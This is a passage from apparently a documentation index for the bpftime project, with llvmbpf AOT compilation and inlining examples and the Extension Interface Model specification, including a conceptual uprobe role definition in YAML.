result xdp-counter.ll can be found in example/standalone/xdp-counter.ll.</p> <p>Then you can write a C code and compile it with the llvm IR:</p> <pre><code>#include &lt;stdint.h&gt;\n#include &lt;stdio.h&gt;\n#include &lt;inttypes.h&gt;\n\nint bpf_main(void* ctx, uint64_t size);\n\nuint32_t ctl_array[2] = { 0, 0 };\nuint64_t cntrs_array[2] = { 0, 0 };\n\nvoid *_bpf_helper_ext_0001(uint64_t map_fd, void *key)\n{\n  printf(\"bpf_map_lookup_elem %lu\\n\", map_fd);\n  if (map_fd == 5) {\n    return &amp;ctl_array[*(uint32_t *)key];\n  } else if (map_fd == 6) {\n    return &amp;cntrs_array[*(uint32_t *)key];\n  } else {\n    return NULL;\n  }\n  return 0;\n}\n\nvoid* __lddw_helper_map_val(uint64_t val)\n{\n    printf(\"map_val %lu\\n\", val);\n    if (val == 5) {\n        return (void *)ctl_array;\n    } else if (val == 6) {\n        return (void *)cntrs_array;\n    } else {\n        return NULL;\n    }\n}\n\nuint8_t bpf_mem[] = { 0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77, 0x88 };\n\nint main() {\n    printf(\"The value of cntrs_array[0] is %\" PRIu64 \"\\n\", cntrs_array[0]);\n    printf(\"calling ebpf program...\\n\");\n    bpf_main(bpf_mem, sizeof(bpf_mem));\n    printf(\"The value of cntrs_array[0] is %\" PRIu64 \"\\n\", cntrs_array[0]);\n    printf(\"calling ebpf program...\\n\");\n    bpf_main(bpf_mem, sizeof(bpf_mem));\n    printf(\"The value of cntrs_array[0] is %\" PRIu64 \"\\n\", cntrs_array[0]);\n    return 0;\n}\n</code></pre> <p>Compile the C code with the llvm IR:</p> <pre><code>clang -g main.c xdp-counter.ll -o standalone \n</code></pre> <p>And you can run the <code>standalone</code> eBPF program directly.</p>"},{"location":"bpftime/llvmbpf/#optimizaion","title":"optimizaion","text":"<p>Based on the AOT compiler, we can apply some optimization strategies:</p>"},{"location":"bpftime/llvmbpf/#inline-the-maps-and-helper-function","title":"inline the maps and helper function","text":"<p>Inline the maps and helper function into the eBPF program, so that the eBPF program can be optimized with <code>const propagation</code>, <code>dead code elimination</code>, etc by the LLVM optimizer. llvmbpf can also eliminate the cost of function calls.</p> <p>Prepare a C code:</p> <pre><code>uint32_t ctl_array[2] = { 0, 0 };\nuint64_t cntrs_array[2] = { 0, 0 };\n\nvoid *_bpf_helper_ext_0001(uint64_t map_fd, void *key)\n{\n  if (map_fd == 5) {\n    return &amp;ctl_array[*(uint32_t *)key];\n  } else if (map_fd == 6) {\n    return &amp;cntrs_array[*(uint32_t *)key];\n  } else {\n    return NULL;\n  }\n  return 0;\n}\n\nvoid* __lddw_helper_map_val(uint64_t val)\n{\n    if (val == 5) {\n        return (void *)ctl_array;\n    } else if (val == 6) {\n        return (void *)cntrs_array;\n    } else {\n        return NULL;\n    }\n}\n</code></pre> <p>Merge the modules with <code>llvm-link</code> and inline them:</p> <pre><code>clang -S -O3 -emit-llvm libmap.c -o libmap.ll\nllvm-link -S -o xdp-counter-inline.ll xdp-counter.ll libmap.ll\nopt --always-inline -S xdp-counter-inline.ll -o xdp-counter-inline.ll\nclang -O3 -g -c xdp-counter-inline.ll -o inline.o\n</code></pre> <p>Run the code with cli:</p> <pre><code>./build/cli/bpftime-vm run example/inline/inline.o test.bin\n</code></pre> <p>Or you can compile as standalone binary and link with the C code:</p> <pre><code>$ clang -O3 example/inline/inline.o example/inline/main.c -o inline\n$ /workspaces/llvmbpf/inline\ncalling ebpf program...\nreturn value = 1\n</code></pre>"},{"location":"bpftime/llvmbpf/#use-original-llvm-ir-from-c-code","title":"Use original LLVM IR from C code","text":"<p>eBPF is a instruction set define for verification, but may not be the best for performance.</p> <p>llvmbpf also support using the original LLVM IR from C code. See example/load-llvm-ir for an example. You can:</p> <ul> <li>Compile the C code to eBPF for verify</li> <li>Compile the C code to LLVM IR and native code for execution in the VM.</li> </ul> <p>The C code:</p> <pre><code>int _bpf_helper_ext_0006(const char *fmt, ... );\n\nint bpf_main(void* ctx, int size) {\n    _bpf_helper_ext_0006(\"hello world: %d\\n\", size);\n    return 0;\n}\n</code></pre> <p>You can compile it with <code>clang -g -c bpf_module.c -o bpf_module.o</code>, and Run the code with cli:</p> <pre><code>./build/cli/bpftime-vm run example/load-llvm-ir/bpf_module.o test.bin\n</code></pre>"},{"location":"bpftime/llvmbpf/#test","title":"Test","text":""},{"location":"bpftime/llvmbpf/#unit-test","title":"Unit test","text":"<p>Compile:</p> <pre><code>sudo apt install llvm-15-dev libzstd-dev\ncmake -B build -DCMAKE_BUILD_TYPE=Debug -DBPFTIME_ENABLE_UNIT_TESTING=1 -DBPFTIME_ENABLE_CODE_COVERAGE=1\ncmake --build build --target all -j\n</code></pre> <p>The unit tests can be found at <code>build/test/unit-test/llvm_jit_tests</code>.</p>"},{"location":"bpftime/llvmbpf/#test-with-bpf-conformance","title":"Test with bpf-conformance","text":"<p>See the CI in .github/workflows/bpf_conformance.yml for how to run the bpf-conformance tests.</p> <p>The test result can be found in https://eunomia-bpf.github.io/llvmbpf/bpf_conformance_results.txt</p>"},{"location":"bpftime/llvmbpf/#license","title":"License","text":"<p>MIT</p> <p>Share on  Share on </p>"},{"location":"bpftime/EIM/","title":"EIM: Extension Interface Model","text":""},{"location":"bpftime/EIM/#the-spec-define-the-interface-between-the-host-and-the-extension","title":"The SPEC define the interface between the host and the extension.","text":"<ol> <li>See spec.md for the full specification.</li> <li>See usage.md for how different role use the interface.</li> <li>See uprobe.md for the example of uprobe role</li> </ol> <p>Share on  Share on </p>"},{"location":"bpftime/EIM/example/","title":"EIM: Example code","text":"<p>See the source for this page to get example code for the EIM.</p>"},{"location":"bpftime/EIM/example/#build-the-example","title":"build the example","text":"<pre><code>make\n</code></pre>"},{"location":"bpftime/EIM/example/#see-the-types-defined-for-the-example","title":"See the types defined for the example","text":"<pre><code>$ sudo bpftool btf dump file /home/yunwei37/bpftime-evaluation/interfeace/test.btf\n[1] INT 'int' size=4 bits_offset=0 nr_bits=32 encoding=SIGNED\n[2] TYPEDEF 'size_t' type_id=3\n[3] INT 'long unsigned int' size=8 bits_offset=0 nr_bits=64 encoding=(none)\n[4] INT 'unsigned int' size=4 bits_offset=0 nr_bits=32 encoding=(none)\n[5] PTR '(anon)' type_id=0\n[6] INT 'unsigned char' size=1 bits_offset=0 nr_bits=8 encoding=(none)\n[7] INT 'short unsigned int' size=2 bits_offset=0 nr_bits=16 encoding=(none)\n[8] INT 'signed char' size=1 bits_offset=0 nr_bits=8 encoding=SIGNED\n[9] INT 'short int' size=2 bits_offset=0 nr_bits=16 encoding=SIGNED\n[10] INT 'long int' size=8 bits_offset=0 nr_bits=64 encoding=SIGNED\n[11] TYPEDEF '__ssize_t' type_id=10\n[12] PTR '(anon)' type_id=13\n[13] INT 'char' size=1 bits_offset=0 nr_bits=8 encoding=SIGNED\n[14] CONST '(anon)' type_id=13\n[15] PTR '(anon)' type_id=14\n[16] TYPEDEF 'ssize_t' type_id=11\n[17] TYPEDEF '__bpftime_ext_ufunction_file_ops_host_open_file' type_id=1\n[18] TYPEDEF '__bpftime_ext_ufunction_file_ops_host_read_file' type_id=1\n[19] TYPEDEF '__bpftime_ext_ufunction_file_ops_host_write_file' type_id=1\n[20] TYPEDEF '__bpftime_capability_FileRead_includes_file_ops_host_open_file' type_id=1\n[21] TYPEDEF '__bpftime_capability_FileRead_includes_file_ops_host_read_file' type_id=1\n[22] TYPEDEF '__bpftime_capability_FileWrite_includes_file_ops_host_write_file' type_id=1\n[23] TYPEDEF '__bpftime_role_BasicFileRole_has_cap_FileRead' type_id=1\n[24] TYPEDEF '__bpftime_role_ExtendedFileRole_has_cap_FileWrite' type_id=1\n[25] TYPEDEF '__bpftime_role_ExtendedFileRole_inherits_BasicFileRole' type_id=1\n[26] TYPEDEF '__bpftime_role_AdminRole' type_id=1\n[27] TYPEDEF '__bpftime_role_AdminRole_inherits_ExtendedFileRole' type_id=1\n[28] PTR '(anon)' type_id=29\n[29] CONST '(anon)' type_id=0\n[30] FUNC_PROTO '(anon)' ret_type_id=1 vlen=0\n[31] FUNC 'main' type_id=30 linkage=static\n[32] FUNC_PROTO '(anon)' ret_type_id=1 vlen=2\n        'data' type_id=15\n        'length' type_id=1\n[33] FUNC '__bpftime_extension_entry_AdminRole_analyze_data' type_id=32 linkage=static\n[34] FUNC_PROTO '(anon)' ret_type_id=1 vlen=2\n        'input' type_id=15\n        'mode' type_id=1\n[35] FUNC '__bpftime_extension_entry_AdminRole_process_string' type_id=34 linkage=static\n[36] FUNC_PROTO '(anon)' ret_type_id=1 vlen=3\n        'fd' type_id=1\n        'buffer' type_id=15\n        'length' type_id=1\n[37] FUNC 'host_write_file' type_id=36 linkage=static\n[38] FUNC_PROTO '(anon)' ret_type_id=1 vlen=3\n        'fd' type_id=1\n        'buffer' type_id=12\n        'length' type_id=1\n[39] FUNC 'host_read_file' type_id=38 linkage=static\n[40] FUNC_PROTO '(anon)' ret_type_id=1 vlen=2\n        'filename' type_id=15\n        'flags' type_id=1\n[41] FUNC 'host_open_file' type_id=40 linkage=static\n</code></pre> <p>In BTF, we use typename to match the spec between host and extension.</p> <p>We can also mannually define the types with yaml for json config.</p> <p>Share on  Share on </p>"},{"location":"bpftime/EIM/spec/","title":"EIM: Extension Interface Model Specification","text":""},{"location":"bpftime/EIM/spec/#1-overview","title":"1. Overview","text":"<p>EIM is a framework for describing fine-grained interactions between extensions (plugins) and a host application. Its central principle is the principle of least privilege: each extension should receive only the minimal resources and interactions required to fulfill its task.</p> <p>EIM addresses two competing needs:</p> <ol> <li>Interconnectedness: Extensions may require access to specific functions or global state in the host.  </li> <li>Safety: The host may want to ensure that buggy extensions can\u2019t crash the system or cause security issues.</li> </ol>"},{"location":"bpftime/EIM/spec/#11-background-why-eim","title":"1.1. Background: Why EIM?","text":"<p>Historically, extension frameworks have faced the problem of letting users do interesting things while not endangering the host. Traditional approaches (like letting all extensions read/write everything in the host) can lead to:</p> <ul> <li>Bugs: A single extension might crash the entire application or cause unexpected side effects.  </li> <li>Security Incidents: If an extension can corrupt memory or call privileged functions, it can compromise the host.</li> </ul> <p>EIM avoids these pitfalls by precisely enumerating host resources as capabilities. This also has benefits for maintenance and auditing:</p> <ul> <li>Clear Separation: The developer defines all possible extension points once.  </li> <li>Reusable: Administrators can add or remove capabilities in the deployment spec without changing the host\u2019s code.  </li> <li>Auditable: An EIM specification is a single document that auditors can review to see which resources are actually granted to each extension.</li> </ul>"},{"location":"bpftime/EIM/spec/#12-key-ideas","title":"1.2. Key Ideas","text":"<ol> <li>Resources: Any \u201cthing\u201d in the host application or the underlying system that an extension might need or want to use\u2014like CPU cycles, memory, global variables, or function calls.  </li> <li>Capabilities: A grant of permission to use a given resource (e.g., the right to read a host variable, the right to call a particular function, or the right to consume a certain amount of CPU instructions).  </li> <li>Extension Entries: Specific hooks or override points in the host application that can be extended. For instance, the host might allow hooking function <code>foo()</code>, or hooking the \u201crequest received\u201d phase in a webserver.</li> </ol> <p>An EIM specification codifies, in detail, the resources an application can provide (development-time) and how those resources are allocated to each extension entry (deployment-time).</p>"},{"location":"bpftime/EIM/spec/#2-concepts","title":"2. Concepts","text":"<p>This section explains the terms relevant to EIM: extensions, resources, capabilities, and extension entries.</p>"},{"location":"bpftime/EIM/spec/#21-extensions","title":"2.1 Extensions","text":"<p>An extension is a piece of software that plugs into a host application at runtime. The host is generally not developed by the extension author (e.g., a user extending nginx, Redis, or some other third-party application). Since direct modifications to the host code can be risky or cumbersome, an extension framework provides safe ways to alter or augment the host\u2019s behavior.</p>"},{"location":"bpftime/EIM/spec/#22-resources","title":"2.2 Resources","text":"<p>A resource is anything the extension might need to interact with. Typical resources include:</p> <ul> <li>Host Variables: Specific variables (like <code>ngx_pid</code> in nginx) or global data structures (e.g., global counters).  </li> <li>Host Functions: Functions within the host that the extension might call (e.g., <code>nginxTime()</code> or <code>processRequest()</code>).  </li> <li>Memory / CPU Quotas: If an extension is allowed to consume CPU cycles or memory, EIM can represent these as numeric resource limits (e.g., <code>instructions&lt;10000</code>).  </li> <li>Runtime-Defined Actions: The extension framework may introduce additional \u201chelper\u201d functions or internal data structures (e.g., \u201cmap helpers\u201d in eBPF-based runtimes).</li> </ul>"},{"location":"bpftime/EIM/spec/#23-capabilities","title":"2.3 Capabilities","text":"<p>A capability is the specific permission to use a given resource. For instance:</p> <ul> <li>State Capability: <code>readPid</code> could allow an extension to read a global variable <code>ngx_pid</code>.  </li> <li>Function Capability: <code>nginxTime</code> might allow calling a function that returns a timestamp, with constraints like \u201creturn value must be positive.\u201d  </li> <li>Resource Capability: <code>instructions &lt; 100000</code> might bound how many instructions an extension can run, or <code>memory &lt; 1MB</code> might limit the memory it can allocate.</li> </ul>"},{"location":"bpftime/EIM/spec/#24-extension-entries","title":"2.4 Extension Entries","text":"<p>An Extension Entry is a hook point in the host application. Extensions replace or wrap the behavior of a function or logic block at that entry. For example, if <code>processRequest</code> in a webserver is declared as an extension entry, an extension can run in place of (or in tandem with) the default <code>processRequest</code> code.</p> <p>Often, these entries are \u201cfunction interposition\u201d points, but EIM does not require them to be at function boundaries only. They could also be inserted in a code path (e.g., after some initialization routine).</p>"},{"location":"bpftime/EIM/spec/#3-eim-specification-structure","title":"3. EIM Specification: Structure","text":"<p>EIM splits its specification into two distinct parts:</p> <ol> <li>Development-Time: Produced by the application developer, who knows how the host is structured.  </li> <li>Deployment-Time: Created by a system administrator who decides how to allocate the host\u2019s resources to each potential extension usage.</li> </ol> <p>By separating these steps, developers do not need to foresee every possible extension\u2019s exact safety constraints. They simply enumerate all possible resources (variables, functions, etc.). The system administrator then tailors which subset of those resources each extension may actually use.</p>"},{"location":"bpftime/EIM/spec/#31-development-time-specification","title":"3.1 Development-Time Specification","text":"<p>Goal: Enumerate all the possible resources the host can offer and define extension entries that can be overridden.</p> <p>At this stage, the developer typically includes:</p> <ol> <li>State Capabilities </li> <li>Named permissions to read or write certain host variables.  </li> <li> <p>Form: <code>State_Capability(name, operation=read|write(variable))</code>.</p> </li> <li> <p>Function Capabilities </p> </li> <li>Named permissions to call host functions.  </li> <li>Must include the function prototype and any constraints (pre-/post-conditions).  </li> <li> <p>Form:  </p> <pre><code>Function_Capability(\n    name          = some_name,\n    prototype     = (arg_types...) -&gt; return_type,\n    constraints   = { some_condition_on_args_and_return }\n)\n</code></pre> </li> <li> <p>Extension Entries </p> </li> <li>Define the points in the host that can be extended.  </li> <li>Must include the original function name (or similar hook reference) and a prototype.  </li> <li> <p>Form:  </p> <pre><code>Extension_Entry(\n    name              = human_readable_name,\n    extension_entry   = actual_host_symbol_name,\n    prototype         = (arg_types...) -&gt; return_type\n)\n</code></pre> </li> </ol>"},{"location":"bpftime/EIM/spec/#311-example-development-time-spec","title":"3.1.1 Example Development-Time Spec","text":"<p>Below is a development-time EIM snippet for nginx:</p> <pre><code>State_Capability(\n    name = \"readPid\",\n    operation = read(ngx_pid)\n)\n\nFunction_Capability(\n    name = \"nginxTime\",\n    prototype = (void) -&gt; time_t,\n    constraints = {rtn &gt; 0}\n)\n\nExtension_Entry(\n    name=\"processBegin\",\n    extension_entry=\"ngx_http_process_request\",\n    prototype = (Request *r) -&gt; int\n)\n\nExtension_Entry(\n    name=\"updateResponseContent\",\n    extension_entry=\"ngx_http_content_phase\",\n    prototype = (Request *r) -&gt; int\n)\n</code></pre> <ul> <li><code>readPid</code>: Allows an extension to read <code>ngx_pid</code>.  </li> <li><code>nginxTime</code>: Allows calling a timestamp function, with a constraint that its return value (<code>rtn</code>) is &gt; 0.  </li> <li><code>processBegin</code>: A place to insert custom logic right after parsing a request.  </li> <li><code>updateResponseContent</code>: A place to modify the response\u2019s content before sending it back.</li> </ul>"},{"location":"bpftime/EIM/spec/#32-deployment-time-specification","title":"3.2 Deployment-Time Specification","text":"<p>Goal: Assign actual capabilities (from the development-time specification) to each extension entry. The admin weighs how much interconnectedness each extension should have versus how restricted it should be for safety.</p> <p>The main object at deployment time is an Extension Class, which includes:</p> <ul> <li>A name </li> <li>The extension entry it targets  </li> <li>A set of capabilities allowed for that entry</li> </ul> <p>Administrators can also add resource capabilities (e.g., bounding CPU or memory) or specify whether the extension can read or write to certain function arguments or local variables.</p>"},{"location":"bpftime/EIM/spec/#321-example-deployment-time-spec","title":"3.2.1 Example Deployment-Time Spec","text":"<p>Below is a deployment-time EIM snippet for the nginx example above:</p> <pre><code>Extension_Class(\n    name = \"observeProcessBegin\",\n    extension_entry = \"processBegin\",\n    allowed = { instructions&lt;inf, nginxTime, readPid, read(r) }\n)\n\nExtension_Class(\n    name = \"updateResponse\",\n    extension_entry = \"updateResponseContent\",\n    allowed = { instructions&lt;inf, read(r), write(r) }\n)\n</code></pre> <ul> <li><code>observeProcessBegin</code> </li> <li>Binds to the <code>processBegin</code> extension entry.  </li> <li>Allows unlimited instructions (<code>instructions&lt;inf</code>), calling <code>nginxTime</code>, reading <code>ngx_pid</code>, and reading from the argument <code>(Request* r)</code>.  </li> <li><code>updateResponse</code> </li> <li>Binds to the <code>updateResponseContent</code> extension entry.  </li> <li>Grants unlimited instructions, read/write access to <code>(Request* r)</code>.</li> </ul> <p>This example shows typical usage where an extension might read the request for logging/analysis, while another extension can modify the request or response. By enumerating them separately, EIM ensures each extension gets only the resources it actually needs.</p>"},{"location":"bpftime/EIM/spec/#4-detailed-semantics-and-rules","title":"4. Detailed Semantics and Rules","text":"<p>EIM is flexible but rests on a few key semantics:</p> <ol> <li>Capability Unions: An extension entry might require multiple capabilities. The final set of allowed capabilities for an extension is the union of those declared in its Extension Class.  </li> <li>Argument Capabilities: EIM uses the function prototype in the extension entry. For example, <code>read(r)</code> indicates read-access to the pointer argument. If an extension needs to modify it, the admin must grant <code>write(r)</code>.  </li> <li>Constraints: A function capability can include conditions on arguments or the return value. These constraints are enforced by the extension framework at load time, ensuring that the extension\u2019s code does not violate them (e.g., by preventing calls with invalid arguments).  </li> <li>Multiple Classes: An administrator could define multiple Extension Classes for the same Extension Entry if different extensions require different levels of access. For example, two classes might exist for <code>processBegin</code>\u2014one for read-only logging, another for read-write firewall actions.  </li> <li>Resource Controls: EIM includes resource capabilities like <code>instructions&lt;10000</code> or <code>memory&lt;2MB</code>. The specifics of how those are enforced can vary by the runtime (via just-in-time verification or other means).</li> </ol>"},{"location":"bpftime/EIM/spec/#5-eim-usage-workflow","title":"5. EIM Usage Workflow","text":"<ol> <li>Host Developer </li> <li>During development of the host, they annotate or otherwise specify:  <ul> <li>Which variables or functions can be extended and how.  </li> <li>Which points in the code are open to extension.  </li> </ul> </li> <li> <p>Produces a \u201cdevelopment-time spec\u201d listing all possible capabilities and extension entries.</p> </li> <li> <p>System Administrator </p> </li> <li>For each real use-case (e.g., a firewall extension or an observability extension), decides how much access is needed.  </li> <li>Creates one or more Extension Classes in the \u201cdeployment-time spec.\u201d  </li> <li> <p>Adjusts safety vs. interconnectedness according to site-specific constraints.</p> </li> <li> <p>Extension Writer </p> </li> <li>Writes an extension referencing a particular Extension Class.  </li> <li>The runtime or loader enforces that the extension only uses the capabilities enumerated in that class.</li> </ol>"},{"location":"bpftime/EIM/spec/#6-example-in-action","title":"6. Example in Action","text":"<p>Below is a short hypothetical scenario:</p> <ol> <li>Host Developer: Writes a video-processing application that can be extended with filters. The developer identifies:  </li> <li>A variable <code>frameCount</code> to track frames processed.  </li> <li>A function <code>applyFilter(Frame *f) -&gt; int</code>.  </li> <li>Two extension entries: <code>beforeRender</code> and <code>afterRender</code>.  </li> <li> <p>A function capability <code>logMessage(char *msg)</code> to write logs.</p> </li> <li> <p>Development-Time Spec might be:</p> </li> </ol> <pre><code>State_Capability(\n    name = \"readFrameCount\",\n    operation = read(frameCount)\n)\n\nFunction_Capability(\n    name = \"logger\",\n    prototype = (char *) -&gt; void,\n    constraints = {}  // No special constraints\n)\n\nExtension_Entry(\n    name = \"beforeRenderHook\",\n    extension_entry = \"beforeRender\",\n    prototype = (Frame *f) -&gt; int\n)\n\nExtension_Entry(\n    name = \"afterRenderHook\",\n    extension_entry = \"afterRender\",\n    prototype = (Frame *f) -&gt; int\n)\n</code></pre> <ol> <li>System Administrator: Decides how to deploy:</li> </ol> <pre><code>Extension_Class(\n    name = \"loggingExtension\",\n    extension_entry = \"afterRenderHook\",\n    allowed = { instructions&lt;50000, logger, readFrameCount, read(f) }\n)\n\nExtension_Class(\n    name = \"watermarkExtension\",\n    extension_entry = \"afterRenderHook\",\n    allowed = { instructions&lt;50000, read(f), write(f) }\n)\n</code></pre> <ol> <li>Extension Developer:</li> <li>Writes an eBPF (or other) extension referencing \u201cloggingExtension\u201d if they want to read <code>frameCount</code> and log statuses.  </li> <li>Another extension references \u201cwatermarkExtension,\u201d which can actually modify the <code>Frame *f</code> to embed a watermark.</li> </ol> <p>This separation of concerns is one of the main advantages of EIM. The host developer describes the \u201cuniverse of possible extension resources,\u201d while the admin determines which portion of that universe each extension gets.</p>"},{"location":"bpftime/EIM/spec/#7-advanced-features-notes","title":"7. Advanced Features &amp; Notes","text":"<ol> <li> <p>Constraints on Function Calls  EIM constraints can do more than \u201creturn value &gt; 0.\u201d The admin/developer can define relationships like \u201carg1 &lt; arg2,\u201d or semantic markers like \u201creturn value must be freed by extension.\u201d Enforcement is typically done by the extension framework\u2019s verifier or at runtime.</p> </li> <li> <p>Parameter-Level Access  Some frameworks allow specifying that an extension may read only certain fields of a struct passed as an argument (more fine-grained than just <code>read(r)</code>). EIM can represent this, but it depends on the runtime\u2019s ability to enforce.  </p> </li> <li> <p>Multiple Classes for One Entry   The same extension entry can appear in multiple extension classes with different capabilities. This is helpful if multiple extensions hooking the same function require different privileges.</p> </li> <li> <p>Resource Capabilities <code>instructions &lt; X</code> or <code>memory &lt; Y</code> might be enforced either by a static analysis or a runtime boundary. EIM only declares it; how it\u2019s enforced is up to the extension framework (e.g., using an eBPF-style verifier or a hardware-based memory boundary).</p> </li> <li> <p>Forward Compatibility   Because the host developer enumerates possible resources, it\u2019s straightforward to add new extension classes later without changing the host code.  </p> </li> </ol>"},{"location":"bpftime/EIM/spec/#8-conclusion","title":"8. Conclusion","text":"<p>The Extension Interface Model (EIM) is a robust way to define fine-grained extension interactions. It puts resource usage under explicit capabilities and organizes them into extension entries. With EIM, both developers and administrators can confidently add, modify, or remove extensions, knowing each extension can only do what\u2019s explicitly allowed.</p>"},{"location":"bpftime/EIM/spec/#key-takeaways","title":"Key Takeaways","text":"<ul> <li>Least Privilege: Let each extension do only what it needs.  </li> <li>Clear Separation: Host developers define the universe of capabilities; admins tailor usage for each extension.  </li> <li>Scalability &amp; Auditing: EIM specifications can be centrally managed and reviewed.  </li> <li>Flexibility: Capabilities can represent host states, host functions, or even bounding resources like CPU instructions.</li> </ul> <p>With an appropriate runtime to enforce EIM (e.g., via static verification and hardware-based isolation), this model yields efficient, safe, and maintainable extension deployments.</p> <p>References (Partial list from the original text)  </p> <ul> <li>[27] Orbit  </li> <li>[48, 52, 63] Classic references on capabilities  </li> <li>[6] Wedge  </li> <li>[10, 31, 38] Other frameworks (Shreds, lwC, RLBox)  </li> <li>[19] WebAssembly  </li> <li>[25] SFI overhead discussions  </li> <li>[58, 64] ERIM  </li> <li>[67] Native Client (NaCl)</li> </ul> <p>(The above references are mentioned for historical context. EIM itself is runtime-agnostic\u2014any system that can interpret and enforce the EIM specification is free to do so.)</p> <p>Share on  Share on </p>"},{"location":"bpftime/EIM/uprobe/","title":"UProbe Role Definition README","text":"<p>This example assumes:</p> <ul> <li>We have a set of host APIs (BPF helpers) related to uprobe usage available.</li> <li>We define capabilities for these APIs.</li> <li>We assign attributes that control resource and operational constraints.</li> <li>We treat the uprobe in userspace eBPF as a specific Role that grants access to the relevant host APIs.</li> </ul>"},{"location":"bpftime/EIM/uprobe/#introduction","title":"Introduction","text":"<p>In the model, a Role defines which capabilities (and thus host APIs) and attributes an extension can access. If we consider uProbes in eBPF as one such role, we need to define:</p> <ol> <li>Host APIs (BPF Helpers) for uProbes: For example:</li> <li>Map helpers: <code>bpf_map_lookup_elem</code>, <code>bpf_map_update_elem</code>, <code>bpf_map_delete_elem</code></li> <li>String helpers: <code>bpf_strncpy</code>, <code>bpf_strnlen</code>, <code>bpf_strcmp</code></li> <li>Memory and probe helpers: <code>bpf_probe_read</code>, <code>bpf_probe_read_str</code></li> <li> <p>Info helpers: <code>bpf_get_current_pid_tgid</code> (or hypothetical helpers that retrieve process/thread info)</p> </li> <li> <p>Capabilities: Group these helpers into logically coherent sets that reflect common usage patterns. For instance:</p> </li> <li><code>MapHelpersCap</code> for map operations</li> <li><code>StringHelpersCap</code> for string operations</li> <li> <p><code>ProbeHelpersCap</code> for reading memory and retrieving info</p> </li> <li> <p>Attributes: Define resource and behavioral constraints for running uProbes, such as:</p> </li> <li><code>max_memory</code> (limit memory usage)</li> <li><code>max_instructions</code> (limit execution time per event)</li> <li><code>allow_memory_write</code> (does this role allow modifications to host memory? Usually not)</li> <li><code>always_const</code>, <code>may_have_side_effect</code>, <code>skip_verification</code> (behavioral attributes depending on trust level)</li> </ol> <p>By composing these capabilities and setting attributes, we create a <code>UprobeRole</code> that extensions can assume to safely and predictably perform uprobe logic.</p>"},{"location":"bpftime/EIM/uprobe/#example-role-definition-conceptual","title":"Example Role Definition (Conceptual)","text":"<pre><code>types:\n  - name: \"const_char_ptr\"\n    base: \"char*\"\n    constraints: [\"non_null\", \"null_terminated\"]\n\n  - name: \"int_positive\"\n    base: \"int\"\n    constraints: [\"value \u2265 0\"]\n\nhost_functions:\n  # Map Helpers\n  - name: \"bpf_map_lookup_elem\"\n    signature:\n      params:\n        - {type: \"void_ptr\", name: \"map\"}\n        - {type: \"const_void_ptr\", name: \"key\"}\n      return_type: \"void_ptr\"\n    function_constraints:\n      - \"map.non_null\"\n      - \"key.non_null\"\n\n  - name: \"bpf_map_update_elem\"\n    signature:\n      params:\n        - {type: \"void_ptr\", name: \"map\"}\n        - {type: \"const_void_ptr\", name: \"key\"}\n        - {type: \"const_void_ptr\", name: \"value\"}\n        - {type: \"int\", name: \"flags\"}\n      return_type: \"int\"\n    function_constraints:\n      - \"map.non_null\"\n      - \"key.non_null\"\n      - \"value.non_null\"\n\n  - name: \"bpf_map_delete_elem\"\n    signature:\n      params:\n        - {type: \"void_ptr\", name: \"map\"}\n        - {type: \"const_void_ptr\", name: \"key\"}\n      return_type: \"int\"\n\n  # String Helpers\n  - name: \"bpf_strncpy\"\n    signature:\n      params:\n        - {type: \"char_ptr\", name: \"dest\"}\n        - {type: \"const_char_ptr\", name: \"src\"}\n        - {type: \"size_t\", name: \"len\"}\n      return_type: \"char_ptr\"\n    function_constraints:\n      - \"dest.non_null\"\n      - \"src.non_null\"\n\n  - name: \"bpf_strnlen\"\n    signature:\n      params:\n        - {type: \"const_char_ptr\", name: \"str\"}\n        - {type: \"size_t\", name: \"maxlen\"}\n      return_type: \"size_t\"\n    function_constraints:\n      - \"str.non_null\"\n\n  # Probe Helpers\n  - name: \"bpf_probe_read\"\n    signature:\n      params:\n        - {type: \"void_ptr\", name: \"dst\"}\n        - {type: \"size_t\", name: \"len\"}\n        - {type: \"const_void_ptr\", name: \"unsafe_ptr\"}\n      return_type: \"int\"\n    function_constraints:\n      - \"dst.non_null\"\n      - \"len &gt; 0\"\n\n  # Info Helpers\n  - name: \"bpf_get_current_pid_tgid\"\n    signature:\n      params: []\n      return_type: \"int\"\n    function_constraints:\n      - \"return \u2265 0\"\n\n  # Uprobe event handling\n  - name: \"handle_uprobe_event\"\n    signature:\n      params:\n        - {type: \"const_void_ptr\", name: \"ctx\"}\n      return_type: \"int\"\n    function_constraints:\n      - \"ctx.non_null\"\n\ncapabilities:\n  - name: \"MapHelpersCap\"\n    apis: [\"bpf_map_lookup_elem\", \"bpf_map_update_elem\", \"bpf_map_delete_elem\"]\n    constraints: [\"All map operations require non_null map and key\"]\n\n  - name: \"StringHelpersCap\"\n    apis: [\"bpf_strncpy\", \"bpf_strnlen\"]\n    constraints: [\"String pointers must be non_null\"]\n\n  - name: \"ProbeHelpersCap\"\n    apis: [\"bpf_probe_read\", \"bpf_get_info\"]\n    constraints: [\"Memory read must be from safe address\", \"Info retrieval must return non-negative\"]\n\n  - name: \"UprobeEventCap\"\n    apis: [\"handle_uprobe_event\"]\n    constraints: [\"ctx must be valid and non_null\"]\n\nroles:\n  - name: \"UprobeRole\"\n    capabilities: [\"MapHelpersCap\", \"StringHelpersCap\", \"ProbeHelpersCap\", \"UprobeEventCap\"]\n    attributes:\n      max_memory: 512                # 512 bytes stack limit\n      max_instructions: 100000       # max instructions per event\n      allow_memory_write: false      # not writing host memory\n      always_const: true            # All variables from extension arguments are treated as const even if not declared as const\n      may_have_side_effect: false     # All resources allocated by the extension are freed by the extension\n      skip_verification: false       # must be verified\n\nextension_exports:\n  # Extensions assigned to UprobeRole can define their own entry points that\n  # the host calls when the uprobe fires.\n  # For all global functions, the extension can treat them as its own entry points.\n</code></pre>"},{"location":"bpftime/EIM/uprobe/#notes","title":"Notes","text":"<ul> <li> <p>Host APIs (uFunc/helpers): We define each BPF helper as a host function with type constraints. The <code>map helpers</code>, <code>bpf_string</code> helpers, <code>bpf_probe_read</code>, and <code>bpf_get_info</code> are part of the defined host APIs. <code>handle_uprobe_event</code> is also defined, representing a host function that can be called by the extension when a uprobe event occurs.</p> </li> <li> <p>Capabilities: We group related APIs into capabilities. For instance, <code>MapHelpersCap</code> contains all the map-related functions. This modular approach allows reusing capabilities in other roles if needed.</p> </li> <li> <p>Attributes: We set <code>max_memory</code>, <code>max_instructions</code>, and other attributes to suit a typical uprobe scenario. <code>may_have_side_effect = true</code> acknowledges that reading memory or updating maps can influence system state. <code>skip_verification = false</code> means the verifier must run to ensure 